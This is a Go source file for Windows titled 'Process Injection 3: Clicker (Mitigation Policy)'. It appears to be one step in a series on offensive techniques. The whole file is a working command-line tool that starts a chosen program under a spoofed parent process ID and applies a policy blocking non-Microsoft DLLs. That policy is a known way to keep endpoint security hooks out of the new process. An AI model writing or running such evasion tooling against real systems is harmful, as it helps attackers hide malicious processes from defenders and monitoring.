package main

import (
	"fmt"
	"os"
	"strings"
	"syscall"
	"unsafe"

	"github.com/alexflint/go-arg"
	"golang.org/x/sys/windows"
)

type args struct {
	File   string   `arg:"-f,required" help:"Absolute file path to be executed"`
	Args   []string `arg:"positional" help:"Arguments for executing the specified file. Prefix with -- for arguments with flags. Example: -- -u foo -p bar"`
	Parent uint     `arg:"-p" help:"Spoof the --file process parent PID"`
}

func banner() string {
	return "Process Injection 3: Clicker (Mitigation Policy)\n"
}

func (args) Description() string {
	return banner()
}

func display(file string, parent uint, args string) {
	fmt.Printf("[*] File: %s\n", file)
	fmt.Printf("[*] PPID Spoofing: %d\n", parent)
	fmt.Printf("[*] Args: %s\n", args)
}

func spawnProcess(target string, parent uint, args string) *windows.ProcessInformation {
	pi := new(windows.ProcessInformation)
	pTarget, _ := syscall.UTF16PtrFromString(target)
	cmdline, _ := syscall.UTF16PtrFromString(target + " " + args)
	si := new(windows.StartupInfoEx)
	si.Cb = uint32(unsafe.Sizeof(*si))
	pta, err := windows.NewProcThreadAttributeList(2)
	if err != nil {
		fmt.Printf("[!] NewProcThreadAttributeList: %s", err.Error())
		os.Exit(1)
	}
	PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON := 0x100000000000
	lpMitigationPolicy := &PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
	pta.Update(windows.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, unsafe.Pointer(lpMitigationPolicy), unsafe.Sizeof(*lpMitigationPolicy))

	var hParent windows.Handle
	if parent > 0 {
		hParent, err = windows.OpenProcess(windows.MAXIMUM_ALLOWED, false, uint32(parent))
		if err != nil {
			fmt.Printf("[!] OpenProcess: %s", err.Error())
			os.Exit(1)
		}
		pta.Update(windows.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, unsafe.Pointer(&hParent), unsafe.Sizeof(hParent))
	}
	defer func() {
		if hParent != 0 {
			fmt.Println("[+] Closing parent process handle")
			windows.CloseHandle(hParent)
		}
	}()
	si.ProcThreadAttributeList = pta.List()
	err = windows.CreateProcess(pTarget, cmdline, nil, nil, false, windows.CREATE_NEW_CONSOLE|windows.EXTENDED_STARTUPINFO_PRESENT, nil, nil, &si.StartupInfo, pi)
	if err != nil {
		fmt.Printf("[!] CreateProcess: %s", err.Error())
		os.Exit(1)
	}
	return pi
}

func main() {
	var opts args
	arg.MustParse(&opts)
	args_str := strings.Join(opts.Args, " ")
	fmt.Println(banner())
	display(opts.File, opts.Parent, args_str)
	fmt.Println("[+] CreateProcess")
	pi := spawnProcess(opts.File, opts.Parent, args_str)
	fmt.Printf("    PID: %d\n", pi.ProcessId)
}
